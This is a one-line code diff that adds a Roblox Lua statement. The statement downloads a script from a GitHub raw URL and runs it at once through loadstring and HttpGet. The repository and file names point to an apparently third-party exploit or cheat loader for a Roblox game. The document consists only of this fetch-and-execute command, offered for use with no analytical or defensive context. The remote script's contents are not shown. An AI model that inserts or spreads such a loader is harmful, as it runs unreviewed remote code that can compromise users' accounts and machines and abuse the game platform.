@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/update-roll-a-stickman-spam0-gogleut0ic65og.lua"))()
